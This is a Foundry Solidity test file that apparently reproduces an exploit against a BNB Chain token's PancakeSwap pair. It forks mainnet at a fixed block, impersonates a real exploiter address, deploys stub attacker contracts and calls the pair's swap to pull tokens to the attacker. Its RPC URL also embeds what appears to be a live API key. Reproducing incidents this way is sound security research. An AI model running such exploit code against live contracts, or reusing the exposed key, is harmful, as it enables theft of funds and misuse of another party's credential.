// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {TOKENbnb} from "../src/TokenBNB.sol";

interface IPancakeRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}

// contract AttackContract {
//     constructor () {}

//     fallback () external payable {}
// }
contract DeployAttacker {
    constructor() {}

    fallback () external payable {}
}
contract Attacker {
    address owner;
    constructor () {
        owner = msg.sender;
    }

    fallback () external payable {}
}

contract Exploit is Test {
    address exploiter = 0x48234fB95D4D3E5a09F3ec4dD57f68281B78C825;
    Attacker attacker;
    IPancakeRouterV2 routerV2;
    IPancakePair pair1;
    DeployAttacker deployer;


    function setUp() public {
        string memory rpcUrl = "https://bnb-mainnet.g.alchemy.com/v2/4MEgBHdaMAe3XgjtesjJN-DvjtHNQdzd";
        uint id = vm.createFork(rpcUrl, 57744488);

        vm.selectFork(id);

        vm.startPrank(exploiter);
        deployer = new DeployAttacker(); // 0x1dffe35fb021f124f04d1a654236e0879fa0cb81
        attacker = new Attacker(); // 0x81f1acd2dad2a9fe2d879e723fb80b7aecdc1337
        vm.stopPrank();

        vm.deal(address(deployer), type(uint).max);
        vm.deal(address(attacker), type(uint).max);

        routerV2 = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair1 = IPancakePair(0x231d9e7181E8479A8B40930961e93E7ed798542C);
    }

    function test_exploit() public {
        
        vm.prank(address(deployer));
        
        console.log("pair one", address(pair1));
        pair1.swap(10e18, 0, address(attacker), "0x00");

    }
}